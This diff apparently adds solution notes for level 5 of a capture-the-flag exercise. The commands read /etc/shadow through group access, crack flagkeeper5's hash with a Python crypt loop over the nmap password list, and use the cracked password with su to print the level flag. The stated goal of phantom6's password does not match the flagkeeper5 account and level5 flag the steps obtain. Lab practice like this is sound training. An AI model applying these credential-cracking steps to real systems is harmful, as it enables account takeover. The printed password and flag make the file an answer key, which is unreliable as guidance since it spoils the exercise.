@@ -1,0 +1,13 @@
+[ Phantom · Level 5 ]  File Authority
+ Full brief:  cat ~/BRIEFING
+
+goal: find password for phantom6
+
+cat ~/BRIEFING: group allows reading /etc/shadow
+id: group includes shadow
+grep -E '^flagkeeper5:' /etc/shadow: hash for flagkeeper5
+/usr/share/nmap/nselib/data/passwords.lst
+wc -l /usr/share/nmap/nselib/data/passwords.lst: 5084
+HASH=$(grep -E '^flagkeeper5:' /etc/shadow | cut -d: -f2) python3 - <<'PY'\nimport os,crypt,sys\nh=os.environ['HASH']\nfor line in open('/usr/share/nmap/nselib/data/passwords.lst','r',errors='ignore'):\n pw=line.strip()\n if pw and crypt.crypt(pw,h)==h:\n print(pw)\n sys.exit(0)\nprint('NOT_FOUND')\nPY: princess
+
+su - flagkeeper5 -c 'cat /var/lib/phantom-flags/level5_flag': bl_phtm5_3ce7637c1fa31cb2
